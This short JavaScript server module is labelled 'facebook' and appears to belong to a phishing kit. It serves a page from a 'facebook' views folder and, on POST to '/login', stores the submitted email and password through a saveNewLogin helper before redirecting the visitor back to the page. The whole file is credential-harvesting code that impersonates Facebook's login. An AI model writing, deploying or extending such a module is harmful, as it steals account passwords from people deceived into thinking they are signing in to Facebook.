exports.info = {
    name: 'facebook',
    views: '/facebook/views',
    static: '/facebook/static'
};

exports.execute = (app, schemaUtils) => {
    app.get('/', (req, res) => {
        res.render('index');
    });

    app.post('/login', (req, res) => {
        let email = req.body.email;
        let pass = req.body.pass;

        if (email && pass) {
            schemaUtils.saveNewLogin(exports.info.name, email, pass);
        }
        res.status(200).redirect('/');
    })
};
